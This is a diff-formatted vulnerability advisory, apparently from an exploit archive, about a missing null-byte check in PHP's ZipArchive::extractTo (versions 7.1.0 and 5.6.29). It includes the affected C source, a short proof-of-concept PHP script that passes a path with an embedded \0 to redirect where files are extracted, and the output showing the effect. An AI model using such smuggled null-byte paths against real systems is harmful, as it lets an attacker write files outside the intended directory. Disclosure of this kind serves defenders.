@@ -1,0 +1,69 @@
+id: 26782
+date: 01/23/2017
+title: PHP 7.1.0 / 5.6.29 missing null byte checks for paths in ZipArchive::extractTo Vulnerability
+author: Maksymilian
+cves: 
+
+Description:
+------------
+ZipArchive->extractTo() doesn’t ensure that pathnames lack NULL byte, which might allow attacker to manipulate the directory path.
+
+Affected method:
+------------------------------------------
+static ZIPARCHIVE_METHOD(extractTo)
+{
+struct zip *intern;
+
+zval *self = getThis();
+zval *zval_files = NULL;
+zval *zval_file = NULL;
+php_stream_statbuf ssb
+;..
+if (!self) {
+RETURN_FALSE;
+}
+
+if (zend_parse_parameters(ZEND_NUM_ARGS(), "s|z", &pathto, &pathto_len, &zval_files) == FAILURE) {
+return;
+}
+
+if (pathto_len < 1) {
+RETURN_FALSE;
+}
+------------------------------------------
+
+
+
+
+Test script:
+---------------
+<?php
+
+if(file_exists("LEVELA/EXTRACTED__HERE")) echo "LEVELA/EXTRACTED__HERE EXISTS!!!1\n";
+if(file_exists("LEVELA/LEVELB/EXTRACTED__HERE")) echo "LEVELB/EXTRACTED__HERE EXISTS!!!2\n";
+
+$zip = new ZipArchive;
+if ($zip->open('toPack/EXTRACTED__HERE.zip') === TRUE) {
+$zip->extractTo("./LEVELA/\0LEVELB");
+$zip->close();
+echo "ok\n";
+} else {
+echo "failed\n";
+}
+
+if(file_exists("LEVELA/EXTRACTED__HERE")) echo "LEVELA/EXTRACTED__HERE EXISTS!!!3\n";
+if(file_exists("LEVELA/LEVELB/EXTRACTED__HERE")) echo "LEVELB/EXTRACTED__HERE EXISTS!!!4\n";
+
+?>
+
+Expected result:
+----------------
+expected parameter not string
+
+Actual result:
+--------------
+# php zip.php
+ok
+LEVELA/EXTRACTED__HERE EXISTS!!!3
+
+#  0day.today [2023-03-24]  #
